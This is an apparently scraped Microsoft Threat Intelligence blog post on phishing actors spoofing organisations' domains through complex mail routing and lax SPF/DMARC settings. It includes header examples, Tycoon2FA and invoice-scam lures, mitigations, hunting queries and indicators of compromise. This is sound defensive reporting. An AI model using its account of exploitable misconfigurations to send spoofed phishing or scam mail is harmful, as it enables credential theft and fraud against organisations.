[
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2026/01/06/phishing-actors-exploit-complex-routing-and-misconfigurations-to-spoof-domains/",
    "title": "Your Privacy Choices Opt-Out Icon",
    "content": "Skip to content Skip to main content Microsoft Microsoft Security Microsoft Security Microsoft Security Home Why Microsoft Security Solutions AI-powered cybersecurity Cloud security Data security & governance Identity & network access Privacy & risk management Security for AI Unified SecOps Zero Trust Products Product families Product families Microsoft Defender Microsoft Entra Microsoft Intune Microsoft Priva Microsoft Purview Microsoft Sentinel Security AI Security AI Microsoft Security Copilot Identity & access Identity & access Microsoft Entra ID (Azure Active Directory) Microsoft Entra Agent ID Microsoft Entra External ID Microsoft Entra ID Governance Microsoft Entra ID Protection Microsoft Entra Internet Access Microsoft Entra Private Access Microsoft Entra Permissions Management Microsoft Entra Verified ID Microsoft Entra Workload ID Microsoft Entra Domain Services Azure Key Vault SIEM & XDR SIEM & XDR Microsoft Sentinel Microsoft Defender for Cloud Microsoft Defender XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Defender for Identity Microsoft Defender for Cloud Apps Microsoft Security Exposure Management Microsoft Defender Vulnerability Management Microsoft Defender Threat Intelligence Cloud security Cloud security Microsoft Defender for Cloud Microsoft Defender Cloud Security Posture Mgmt Microsoft Defender External Attack Surface Management Azure Firewall Azure Web App Firewall Azure DDoS Protection GitHub Advanced Security Endpoint security & management Endpoint security & management Microsoft Defender for Endpoint Microsoft Defender XDR Microsoft Defender for Business Microsoft Intune core capabilities Microsoft Defender for IoT Microsoft Defender Vulnerability Management Microsoft Intune Advanced Analytics Microsoft Intune Endpoint Privilege Management\u200b Microsoft Intune Enterprise Application Management Microsoft Intune Remote Help Microsoft Cloud PKI Compliance & privacy Compliance & privacy Microsoft Purview Communication Compliance Microsoft Purview Compliance Manager Microsoft Purview Data Lifecycle Management Microsoft Purview eDiscovery Microsoft Purview Audit Microsoft Priva Risk Management Microsoft Priva Subject Rights Requests Data security & governance Data security & governance Microsoft Purview Information Protection Microsoft Purview Insider Risk Management Microsoft Purview Data Loss Prevention Microsoft Purview Data Governance Pricing Services Partners Resources Get started Get started Cybersecurity awareness Customer stories Security 101 Product trials How we protect Microsoft Reports and analysis Reports and analysis Industry recognition Microsoft Security Insider Microsoft Digital Defense Report Security Response Center Community Community Microsoft Security Blog Microsoft Security Events Microsoft Tech Community Documentation and training Documentation and training Documentation Technical Content Library Training & certifications Additional sites Additional sites Compliance Program for Microsoft Cloud Microsoft Trust Center Security Engineering Portal Service Trust Portal Microsoft Secure Future Initiative Business Solutions Hub Contact Sales Start free trial More All Microsoft Global Microsoft Security Azure Dynamics 365 Microsoft 365 Microsoft Teams Windows 365 Tech & innovation Tech & innovation Microsoft AI Azure Space Mixed reality Microsoft HoloLens Microsoft Viva Quantum computing Sustainability Industries Industries Education Automotive Financial services Government Healthcare Manufacturing Retail Partners Partners Find a partner Become a partner Partner Network Microsoft Marketplace Marketplace Rewards Software development companies Resources Resources Blog Microsoft Advertising Developer Center Documentation Events Licensing Microsoft Learn Microsoft Research View Sitemap Search Search Microsoft Security No results Cancel Home Phishing actors exploit complex routing and misconfigurations to spoof domains Search Research January 6 16 min read Phishing actors exploit complex routing and misconfigurations to spoof domains By Microsoft Threat Intelligence Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender for Cloud Apps Microsoft Defender for Office 365 Microsoft Defender XDR Microsoft Entra Microsoft Entra ID Topics Threat intelligence Phishing actors are exploiting complex routing scenarios and misconfigured spoof protections to effectively spoof organizations\u2019 domains and deliver phishing emails that appear, superficially, to have been sent internally. Threat actors have leveraged this vector to deliver a wide variety of phishing messages related to various phishing-as-a-service (PhaaS) platforms such as Tycoon2FA. These include messages with lures themed around voicemails, shared documents, communications from human resources (HR) departments, password resets or expirations, and others, leading to credential phishing. This attack vector is not new but has seen increased visibility and use since May 2025. The phishing campaigns Microsoft has observed using this attack vector are opportunistic rather than targeted in nature, with messages sent to a wide variety of organizations across several industries and verticals. Notably, Microsoft has also observed a campaign leveraging this vector to conduct financial scams against organizations. While these attacks share many characteristics with other credential phishing email campaigns, the attack vector abusing complex routing and improperly configured spoof protections distinguishes these campaigns. The phishing attack vector covered in this blog post does not affect customers whose Microsoft Exchange mail exchanger (MX) records point to Office 365; these tenants are protected by native built-in spoofing detections. Phishing messages sent through this vector may be more effective as they appear to be internally sent messages. Successful credential compromise through phishing attacks may lead to data theft or business email compromise (BEC) attacks against the affected organization or partners and may require extensive remediation efforts, and/or lead to loss of funds in the case of financial scams. While Microsoft detects the majority of these phishing attack attempts, organizations can further reduce risk by properly configuring spoof protections and any third-party connectors to prevent spoofed phish or scam messages sent through this attack vector from reaching inboxes. In this blog, we explain how threat actors are exploiting these routing scenarios and provide observations from related attacks. We provide specific examples\u2014including technical analysis of phishing messages, spoof protections, and email headers\u2014to help identify this attack vector. This blog also provides additional resources with information on how to set up mail flow rules, enforce spoof protections, and configure third-party connectors to prevent spoofed phishing messages from reaching user inboxes. Spoofed phishing attacks In cases where a tenant has configured a complex routing scenario, where the MX records are not pointed to Office 365, and the tenant has not configured strictly enforced spoof protections, threat actors may be able to send spoofed phishing messages that appear to have come from the tenant\u2019s own domain. Setting strict Domain-based Message Authentication, Reporting, and Conformance (DMARC) reject and SPF hard fail (rather than soft fail) policies and properly configuring any third-party connectors will prevent phishing attacks spoofing organizations\u2019 domains. This vector is not, as has been publicly reported, a vulnerability of Direct Send , a mail flow method in Microsoft 365 Exchange Online that allows devices (like printers, scanners), applications, or third-party services to send email without authentication using the organization\u2019s accepted domain, but rather takes advantage of complex routing scenarios and misconfigured spoof protections. Tenants with MX records pointed directly to Office 365 are not vulnerable to this attack vector of sending spoofed phishing messages. As with most other phishing attacks observed by Microsoft Threat intelligence throughout 2025, the bulk of phishing campaigns observed using this attack vector employ the Tycoon2FA PhaaS platform , in addition to several other phishing services in use as well. In October 2025, Microsoft Defender for Office 365 blocked more than 13 million malicious emails linked to Tycoon2FA, including many attacks spoofing organizations\u2019 domains. PhaaS platforms such as Tycoon2FA provide threat actors with a suite of capabilities, support, and ready-made lures and infrastructure to carry out phishing attacks and compromise credentials. These capabilities include adversary-in-the-middle (AiTM) phishing, which is intended to circumvent multifactor authentication (MFA) protections. Credential phishing attacks sent through this method employ a variety of themes such as voicemail notifications, password resets, HR communications, among others. Microsoft Threat Intelligence has also observed emails intended to trick organizations into paying fake invoices, potentially leading to financial losses. Generally, in these spoofed phishing attacks, the recipient email address is used in both the \u201cTo\u201d and \u201cFrom\u201d fields of the email, though some attacks will change the display name of the sender to make the attack more convincing and the \u201cFrom\u201d field could contain any valid internal email address. Credential phishing with spoofed emails The bulk of phishing messages sent through this attack vector uses the same lures as conventionally sent phishing messages, masquerading as services such as Docusign, or communications from HR regarding salary or benefits changes, password resets, and so on. They may employ clickable links in the email body or QR codes in attachments or other means of getting the recipient to navigate to a phish landing page. The appearance of having been sent from an internal email address is the most visible distinction to an end user, often with the same email address used in the \u201cTo\u201d and \u201cFrom\u201d fields. Email headers provide more information regarding the delivery of spoofed phishing emails, such as the appearance of an external IP address used by the threat actor to initiate the phishing attack. Depending on the configuration of the tenant, there will be SPF soft or hard fail, DMARC fail, and DKIM will equal none as both the sender and recipient appear to be in the same domain. At a basic level of protection, these should cause a message to land in a spam folder, but a user may retrieve and interact with phishing messages routed to spam. The X-MS-Exchange-Organization-InternalOrgSender will be set to True , but X-MS-Exchange-Organization-MessageDirectionality will be set to Incoming and X-MS-Exchange-Organization-ASDirectionalityType will have a value of \u201c1\u201d, indicating that the message was sent from outside of the organization. The combination of internal organization sender and incoming directionality is indicative of a message spoofed to appear as an internal communication, but not necessarily indicative of maliciousness. X-MS-Exchange-Organization-AuthAs will be set to Anonymous , indicating that the message came from an external source. The Authentication-Results header example provided below illustrates the result of enforced authentication. 000 is an explicit DMARC failure. The resultant action is either reject or quarantine . The headers shown here are examples of properly configured environments, effectively blocking phishing emails sent through this attack vector: spf=fail (sender IP is 51.89.59[.]188) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=quarantine header.from=contoso.com;compauth=fail reason=000 spf=fail (sender IP is 51.68.182[.]101) smtp.mailfrom= contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=oreject header.from=contoso.com; Any third-party connectors\u2014such as a spam filtering service, security solution, or archiving service\u2014must be configured properly or spoof detections cannot be calculated correctly, allowing phishing emails such as the examples below to be delivered. The first of these examples indicate the expected authentication failures in the header, but no action is taken due to reason 905, which indicates that the tenant has set up complex routing where the mail exchanger record (MX record) points to either an on-premises Exchange environment or a third-party service before reaching Microsoft 365: spf=fail (sender IP is 176.111.219[.]85) smtp.mailfrom= contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=none header.from= contoso.com;compauth=none reason=905 The phishing message masquerades as a notification from Microsoft Office 365 informing the recipient that their password will soon expire, although the subject line appears to be intended for a voicemail themed lure. The link in the email is a nested Google Maps URL pointing to an actor-controlled domain at online.amphen0l-fci[.]com . Figure 1. This phishing message uses a \u201cpassword expiration\u201d lure masquerading as a communication from Microsoft. The second example also shows the expected authentication failures, but with an action of \u201coreject\u201d with reason 451, indicating complex routing and that the message was delivered to the spam folder. spf=softfail (sender IP is 162.19.129[.]232) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=oreject header.from=contoso.com;compauth=none reason=451 This email masquerades as a SharePoint communication asking the recipient to review a shared document. The sender and recipient addresses are the same, though the threat actor has set the display name of the sender to \u201cPending Approval\u201d. The InternalOrgSender header is set to True . On the surface, this appears to be an internally sent email, though the use of the recipient\u2019s address in both the \u201cTo\u201d and \u201cFrom\u201d fields may alert an end user that this message is not legitimate. Figure 2. This phishing message uses a \u201cshared document\u201d lure masquerading as SharePoint. The nested Google URL in the email body points to actor-controlled domain scanuae[.]com . This domain acts as a redirector, loading a script that constructs a URL using the recipient\u2019s Base64-encoded email before loading a custom CAPTCHA page on the Tycoon2FA domain valoufroo.in[.]net . A sample of the script loaded on scanuae[.]com is shown here: Figure 3. This script crafts and redirects to a URL on a Tycoon2FA PhaaS domain. The below example of the custom CAPTCHA page is loaded at the Tycoon2FA domain goorooyi.yoshemo.in[.]net . The CAPTCHA is one of many similar CAPTCHAs observed in relation to Tycoon2FA phishing sequences. Clicking through it leads to a Tycoon2FA phish landing page where the recipient is prompted to input their credentials. Alternatively, clicking through the CAPTCHA may lead to a benign page on a legitimate domain, a tactic intended to evade detection and analysis. Figure 4. A custom CAPTCHA loaded on the Tycoon2FA PhaaS domain. Spoofed email financial scams Microsoft Threat Intelligence has also observed financial scams sent through spoofed emails. These messages are crafted to look like an email thread between a highly placed employee at the targeted organization, often the CEO of the organization, an individual requesting payment for services rendered, or the accounting department at the targeted organization. In this example, the message was initiated from 163.5.169[.]67 and authentication failures were not enforced, as DMARC is set to none and action is set to none , a permissive mode that does not protect against spoofed messages, allowing the message to reach the inbox on a tenant whose MX record is not pointed to Office 365. Authentication-Results spf=fail (sender IP is 163.5.169[.]67) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=none action=none header.from=contoso.com;compauth=fail reason=601 The scam message is crafted to appear as an email thread with a previous message between the CEO of the targeted organization, using the CEO\u2019s real name, and an individual requesting payment of an invoice. The name of the individual requesting payment (here replaced with \u201cJohn Doe\u201d) appears to be a real person, likely a victim of identity theft. The \u201cTo\u201d and \u201cFrom\u201d fields both use the address for the accounting department at the targeted organization, but with the CEO\u2019s name used as the display name in the \u201cFrom\u201d field. As with our previous examples, this email superficially appears to be internal to the organization, with only the use of the same address as sender and recipient indicating that the message may not be legitimate. The body of the message also attempts to instill a sense of urgency, asking for prompt payment to retain a discount. Figure 5. An email crafted to appear as part of an ongoing thread directing a company\u2019s accounting department to pay a fake invoice. Figure 6. Included as part of the message shown above, this is crafted to appear as an earlier communication between the CEO of the company and an individual seeking payment. Most of the emails observed as part of this campaign include three attached files. The first is the fake invoice requesting several thousand dollars to be sent through ACH payment to a bank account at an online banking company. The name of the individual requesting payment is also listed along with a fake company name and address. The bank account was likely set up using the individual\u2019s stolen personally identifiable information. Figure 7. A fake invoice including banking information attached to the scam messages. The second attachment (not pictured) is an IRS W-9 form that lists the name and social security number of the individual used to set up the bank account. The third attachment is a fake \u201cbank letter\u201d ostensibly provided by an employee at the online bank used to set up the fraudulent account. The letter provides the same banking information as the invoice and attempts to add another layer of believability to the scam. Figure 8. A fake \u201cbank letter\u201d also attached to the scam messages. Falling victim to this scam could result in significant financial losses that may not be recoverable as the funds will likely be moved quickly by the actor in control of the fraudulent bank account. Mitigation and protection guidance Preventing spoofed email attacks The following links provide information for customers whose MX records are not pointed to Office 365 on how to configure mail flow connectors and rules to prevent spoofed emails from reaching inboxes. These links provide information on how to properly configure mail flow with connectors: Manage mail flow using a third-party cloud service with Exchange Online Configure mail flow using connectors in Exchange Online Mail flow rules (transport rules) in Exchange Online Enhanced filtering for connectors in Exchange Online These links provide information on configuring SPF, DKIM, and DMARC: Email authentication in cloud organizations Set up SPF to identify valid email sources for your custom cloud domains Set up DKIM to sign mail from your cloud domain Set up DMARC to validate the From address domain for cloud senders The following links provide more in-depth information on Direct Send: Introducing more control over Direct Send in Exchange Online Direct Send vs sending directly to an Exchange Online tenant Mitigating AiTM phishing attacks Microsoft Threat Intelligence recommends the following mitigations, which are effective against a range of phishing threats. Review our recommended settings for Exchange Online Protection and Microsoft Defender for Office 365. Configure Microsoft Defender for Office 365 to recheck links on click. Safe Links provides URL scanning and rewriting of inbound email messages in mail flow, and time-of-click verification of URLs and links in email messages, other Microsoft 365 applications such as Teams, and other locations such as SharePoint Online. Safe Links scanning occurs in addition to the regular anti-spam and anti-malware protection in inbound email messages in Microsoft Exchange Online Protection (EOP). Safe Links scanning can help protect your organization from malicious links used in phishing and other attacks. Turn on Zero-hour auto purge (ZAP ) in Defender for Office 365 to quarantine sent mail in response to newly-acquired threat intelligence and retroactively neutralize malicious phishing, spam, or malware messages that have already been delivered to mailboxes. Encourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen , which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware. Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attack tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants Configure Microsoft Entra with increased security . Pilot and deploy phishing-resistant authentication methods for users. Implement Entra ID Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps. Mitigating threats from phishing actors begins with securing user identity by eliminating traditional credentials and adopting passwordless, phishing-resistant MFA methods such as FIDO2 security keys, Windows Hello for Business, and Microsoft Authenticator passkeys. Microsoft recommends enforcing phishing-resistant MFA for privileged roles in Microsoft Entra ID to significantly reduce the risk of account compromise. Learn how to require phishing-resistant MFA for admin roles and plan a passwordless deployment . Passwordless authentication improves security as well as enhances user experience and reduces IT overhead. Explore Microsoft\u2019s overview of passwordless authentication and authentication strength guidance to understand how to align your organization\u2019s policies with best practices. For broader strategies on defending against identity-based attacks, refer to Microsoft\u2019s blog on evolving identity attack techniques . If Microsoft Defender alerts indicate suspicious activity or confirmed compromised account or a system, it\u2019s essential to act quickly and thoroughly. Below are recommended remediation steps for each affected identity: Reset credentials \u2013 Immediately reset the account\u2019s password and revoke any active sessions or tokens. This ensures that any stolen credentials can no longer be used. Re-register or remove MFA devices \u2013 Review users MFA devices, specifically those recently added or updated. Revert unauthorized payroll or financial changes \u2013 If the attacker modified payroll or financial configurations, such as direct deposit details, revert them to their original state and notify the appropriate internal teams. Remove malicious inbox rules \u2013 Attackers often create inbox rules to hide their activity or forward sensitive data. Review and delete any suspicious or unauthorized rules. Verify MFA reconfiguration \u2013 Confirm that the user has successfully reconfigured MFA and that the new setup uses secure, phishing-resistant methods. Microsoft Defender XDR detections Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence. Tactic Observed activity Microsoft Defender coverage Initial access Threat actor gains access to account through phishing Microsoft Defender for Office 365 \u2013 A potentially malicious URL click was detected \u2013 Email messages containing malicious file removed after delivery \u2013 Email messages containing malicious URL removed after delivery \u2013 Email messages from a campaign removed after delivery. Microsoft Defender XDR \u2013 Compromised user account in a recognized attack pattern \u2013 Anonymous IP address \u2013 Suspicious activity likely indicative of a connection to an adversary-in-the-middle (AiTM) phishing site Defense evasion Threat actor creates an inbox rule post compromise Microsoft Defender for Cloud apps \u2013 Possible BEC-related inbox rule \u2013 Suspicious inbox manipulation rule Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following prebuilt promptbooks to automate incident response or investigation tasks related to this threat: Incident investigation Microsoft User analysis Threat actor profile Threat Intelligence 360 report based on MDTI article Vulnerability impact assessment Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel. Threat intelligence reports Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments. Microsoft Defender XDR threat analytics Actor profile: Storm-1747 Technique profile: Adversary-in-the-middle credential phishing Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor. Hunting queries Microsoft Defender XDR Microsoft Defender XDR customers can run the following query to find related activity in their networks: Finding potentially spoofed emails: EmailEvents | where Timestamp >= ago(30d) | where EmailDirection == \"Inbound\" | where Connectors == \"\" // No connector used | where SenderFromDomain in (\"contoso.com\") // Replace with your domain(s) | project Timestamp, NetworkMessageId, InternetMessageId, SenderMailFromAddress, SenderFromAddress, SenderDisplayName, SenderFromDomain, SenderIPv4, RecipientEmailAddress, Subject, DeliveryAction, DeliveryLocation Finding more suspicious, potentially spoofed emails: EmailEvents | where EmailDirection == \"Inbound\" | where Connectors == \"\" // No connector used | where SenderFromDomain in (\"contoso.com\", \"fabrikam.com\") // Replace with your accepted domains | where AuthenticationDetails !contains \"SPF=pass\" // SPF failed or missing | where AuthenticationDetails !contains \"DKIM=pass\" // DKIM failed or missing | where AuthenticationDetails !contains \"DMARC=pass\" // DMARC failed or missing | where SenderIPv4 !in (\" \") // Exclude known relay IPs | where ThreatTypes has_any (\"Phish\", \"Spam\") or ConfidenceLevel == \"High\" // | project Timestamp, NetworkMessageId, InternetMessageId, SenderMailFromAddress, SenderFromAddress, SenderDisplayName, SenderFromDomain, SenderIPv4, RecipientEmailAddress, Subject, AuthenticationDetails, DeliveryAction Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace. The below hunting queries can also be found in the Microsoft Defender portal for customers who have Microsoft Defender XDR installed from the Content Hub, or accessed directly from GitHub. Spoof and impersonation phish detections Spoof attempts with auth failure Below are the queries using Sentinel Advanced Security Information Model (ASIM) functions to hunt threats across both Microsoft first-party and third-party data sources. ASIM also supports deploying parsers to specific workspaces from GitHub , using an ARM template or manually. Detect network IP and domain indicators of compromise using ASIM The following query checks domain and URL IOCs across data sources supported by ASIM web session parser: //IP list and domain list- _Im_NetworkSession let lookback = 30d; let ioc_ip_addr = dynamic([\"162.19.196.13\", \"163.5.221.110\", \"51.195.94.194\", \"51.89.59.188\"]); let ioc_domains = dynamic([\"2fa.valoufroo.in.net\", \"valoufroo.in.net\", \"integralsm.cl\", \"absoluteprintgroup.com\"]); _Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains) | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor Detect web sessions IP and file hash indicators of compromise using ASIM The following query checks domain and URL IOCs across data sources supported by ASIM web session parser: //IP list - _Im_WebSession let lookback = 30d; let ioc_ip_addr = dynamic([\"162.19.196.13\", \"163.5.221.110\", \"51.195.94.194\", \"51.89.59.188\"]); _Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) | summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor Detect domain and URL indicators of compromise using ASIM The following query checks domain and URL IOCs across data sources supported by ASIM web session parser: // file hash list - imFileEvent // Domain list - _Im_WebSession let ioc_domains = dynamic([\"2fa.valoufroo.in.net\", \"valoufroo.in.net\", \"integralsm.cl\", \"absoluteprintgroup.com\"]); _Im_WebSession (url_has_any = ioc_domains) Spoofing attempts from specific domains // Add the list of domains to search for. let DomainList = dynamic([\"2fa.valoufroo.in.net\", \"valoufroo.in.net\", \"integralsm.cl\", \"absoluteprintgroup.com\"]); EmailEvents | where TimeGenerated > ago (1d) and DetectionMethods has \"spoof\" and SenderFromDomain in~ (DomainList) | project TimeGenerated, AR=parse_json(AuthenticationDetails) , NetworkMessageId, EmailDirection, Subject, SenderFromAddress, SenderIPv4, ThreatTypes, DetectionMethods, ThreatNames | evaluate bag_unpack(AR) | where column_ifexists('SPF','') =~ \"fail\" or column_ifexists('DMARC','') =~ \"fail\" or column_ifexists('DKIM','') =~ \"fail\" or column_ifexists('CompAuth','') =~ \"fail\" | extend Name = tostring(split(SenderFromAddress, '@', 0)[0]), UPNSuffix = tostring(split(SenderFromAddress, '@', 1)[0]) | extend Account_0_Name = Name | extend Account_0_UPNSuffix = UPNSuffix | extend IP_0_Address = SenderIPv4 Indicators of compromise Indicator Type Description First seen Last seen 162.19.196[.]13 IPv4 An IP address used by an actor to initiate spoofed phishing emails. 2025-10-08 2025-11-21 163.5.221[.]110 IPv4 An IP address used by an actor to initiate spoofed phishing emails. 2025-09-10 2025-11-20 51.195.94[.]194 IPv4 An IP address used by an actor to initiate spoofed phishing emails. 2025-06-15 2025-12-07 51.89.59[.]188 IPv4 An IP address used by an actor to initiate spoofed phishing emails. 2025-09-24 2025-11-20 2fa.valoufroo.in[.]net Domain A Tycoon2FA PhaaS domain valoufroo.in[.]net Domain A Tycoon2FA PhaaS domain integralsm[.]cl Domain A redirection domain leading to phishing infrastructure. absoluteprintgroup[.]com Domain A redirection domain leading to phishing infrastructure. References https://www.mimecast.com/threat-intelligence-hub/microsoft-direct-send-abuse/ https://www.proofpoint.com/us/blog/email-and-cloud-threats/attackers-abuse-m365-for-internal-phishing https://www.varonis.com/blog/direct-send-exploit Learn more For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog . To get notified about new publications and to join discussions on social media, follow us on LinkedIn , X (formerly Twitter) , and Bluesky . To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast . X LinkedIn Microsoft Threat Intelligence See Microsoft Threat Intelligence posts Related posts February 10 15 min read Manipulating AI memory for profit: The rise of AI Recommendation Poisoning That helpful \u201cSummarize with AI\u201d button? It might be secretly manipulating what your AI recommends. February 9 3 min read A one-prompt attack that breaks LLM safety alignment As LLMs and diffusion models power more applications, their safety alignment becomes critical. February 6 5 min read Analysis of active exploitation of SolarWinds Web Help Desk We are seeing exploitation of SolarWinds Web Help Desk via CVE\u20112025\u201140551 and CVE\u20112025\u201140536 that can lead to domain compromise; here is how to patch, hunt, and mitigate now. Get started with Microsoft Security Protect your people, data, and infrastructure with AI-powered, end-to-end security from Microsoft. Learn how Connect with us on social X YouTube LinkedIn What's new Surface Pro Surface Laptop Surface Laptop Studio 2 Copilot for organizations Copilot for personal use AI in Windows Explore Microsoft products Windows 11 apps Microsoft Store Account profile Download Center Microsoft Store support Returns Order tracking Certified Refurbished Microsoft Store Promise Flexible Payments Education Microsoft in education Devices for education Microsoft Teams for Education Microsoft 365 Education How to buy for your school Educator training and development Deals for students and parents AI for education Business Microsoft AI Microsoft Security Dynamics 365 Microsoft 365 Microsoft Power Platform Microsoft Teams Microsoft 365 Copilot Small Business Developer & IT Azure Microsoft Developer Microsoft Learn Support for AI marketplace apps Microsoft Tech Community Microsoft Marketplace Marketplace Rewards Visual Studio Company Careers About Microsoft Company news Privacy at Microsoft Investors Diversity and inclusion Accessibility Sustainability English (United States) Your Privacy Choices Opt-Out Icon Your Privacy Choices Consumer Health Privacy Sitemap Contact Microsoft Privacy Manage cookies Terms of use Trademarks Safety & eco Recycling About our ads \u00a9 Microsoft 2026",
    "filtered_content": "Skip to content Skip to main content Microsoft Microsoft Security Microsoft Security Microsoft Security Home Why Microsoft Security Solutions AI-powered cybersecurity Cloud security Data security & governance Identity & network access Privacy & risk management Security for AI Unified SecOps Zero Trust Products Product families Product families Microsoft Defender Microsoft Entra Microsoft Intune Microsoft Priva Microsoft Purview Microsoft Sentinel Security AI Security AI Microsoft Security Copilot Identity & access Identity & access Microsoft Entra ID (Azure Active Directory) Microsoft Entra Agent ID Microsoft Entra External ID Microsoft Entra ID Governance Microsoft Entra ID Protection Microsoft Entra Internet Access Microsoft Entra Private Access Microsoft Entra Permissions Management Microsoft Entra Verified ID Microsoft Entra Workload ID Microsoft Entra Domain Services Azure Key Vault SIEM & XDR SIEM & XDR Microsoft Sentinel Microsoft Defender for Cloud Microsoft Defender XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Defender for Identity Microsoft Defender for Cloud Apps Microsoft Security Exposure Management Microsoft Defender Vulnerability Management Microsoft Defender Threat Intelligence Cloud security Cloud security Microsoft Defender for Cloud Microsoft Defender Cloud Security Posture Mgmt Microsoft Defender External Attack Surface Management Azure Firewall Azure Web App Firewall Azure DDoS Protection GitHub Advanced Security Endpoint security & management Endpoint security & management Microsoft Defender for Endpoint Microsoft Defender XDR Microsoft Defender for Business Microsoft Intune core capabilities Microsoft Defender for IoT Microsoft Defender Vulnerability Management Microsoft Intune Advanced Analytics Microsoft Intune Endpoint Privilege Management\u200b Microsoft Intune Enterprise Application Management Microsoft Intune Remote Help Microsoft Cloud PKI Compliance & privacy Compliance & privacy Microsoft Purview Communication Compliance Microsoft Purview Compliance Manager Microsoft Purview Data Lifecycle Management Microsoft Purview eDiscovery Microsoft Purview Audit Microsoft Priva Risk Management Microsoft Priva Subject Rights Requests Data security & governance Data security & governance Microsoft Purview Information Protection Microsoft Purview Insider Risk Management Microsoft Purview Data Loss Prevention Microsoft Purview Data Governance Pricing Services Partners Resources Get started Get started Cybersecurity awareness Customer stories Security 101 Product trials How we protect Microsoft Reports and analysis Reports and analysis Industry recognition Microsoft Security Insider Microsoft Digital Defense Report Security Response Center Community Community Microsoft Security Blog Microsoft Security Events Microsoft Tech Community Documentation and training Documentation and training Documentation Technical Content Library Training & certifications Additional sites Additional sites Compliance Program for Microsoft Cloud Microsoft Trust Center Security Engineering Portal Service Trust Portal Microsoft Secure Future Initiative Business Solutions Hub Contact Sales Start free trial More All Microsoft Global Microsoft Security Azure Dynamics 365 Microsoft 365 Microsoft Teams Windows 365 Tech & innovation Tech & innovation Microsoft AI Azure Space Mixed reality Microsoft HoloLens Microsoft Viva Quantum computing Sustainability Industries Industries Education Automotive Financial services Government Healthcare Manufacturing Retail Partners Partners Find a partner Become a partner Partner Network Microsoft Marketplace Marketplace Rewards Software development companies Resources Resources Blog Microsoft Advertising Developer Center Documentation Events Licensing Microsoft Learn Microsoft Research View Sitemap Search Search Microsoft Security No results Cancel Home Phishing actors exploit complex routing and misconfigurations to spoof domains Search Research January 6 16 min read Phishing actors exploit complex routing and misconfigurations to spoof domains By Microsoft Threat Intelligence Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender for Cloud Apps Microsoft Defender for Office 365 Microsoft Defender XDR Microsoft Entra Microsoft Entra ID Topics Threat intelligence Phishing actors are exploiting complex routing scenarios and misconfigured spoof protections to effectively spoof organizations\u2019 domains and deliver phishing emails that appear, superficially, to have been sent internally. Threat actors have leveraged this vector to deliver a wide variety of phishing messages related to various phishing-as-a-service (PhaaS) platforms such as Tycoon2FA. These include messages with lures themed around voicemails, shared documents, communications from human resources (HR) departments, password resets or expirations, and others, leading to credential phishing. This attack vector is not new but has seen increased visibility and use since May 2025. The phishing campaigns Microsoft has observed using this attack vector are opportunistic rather than targeted in nature, with messages sent to a wide variety of organizations across several industries and verticals. Notably, Microsoft has also observed a campaign leveraging this vector to conduct financial scams against organizations. While these attacks share many characteristics with other credential phishing email campaigns, the attack vector abusing complex routing and improperly configured spoof protections distinguishes these campaigns. The phishing attack vector covered in this blog post does not affect customers whose Microsoft Exchange mail exchanger (MX) records point to Office 365; these tenants are protected by native built-in spoofing detections. Phishing messages sent through this vector may be more effective as they appear to be internally sent messages. Successful credential compromise through phishing attacks may lead to data theft or business email compromise (BEC) attacks against the affected organization or partners and may require extensive remediation efforts, and/or lead to loss of funds in the case of financial scams. While Microsoft detects the majority of these phishing attack attempts, organizations can further reduce risk by properly configuring spoof protections and any third-party connectors to prevent spoofed phish or scam messages sent through this attack vector from reaching inboxes. In this blog, we explain how threat actors are exploiting these routing scenarios and provide observations from related attacks. We provide specific examples\u2014including technical analysis of phishing messages, spoof protections, and email headers\u2014to help identify this attack vector. This blog also provides additional resources with information on how to set up mail flow rules, enforce spoof protections, and configure third-party connectors to prevent spoofed phishing messages from reaching user inboxes. Spoofed phishing attacks In cases where a tenant has configured a complex routing scenario, where the MX records are 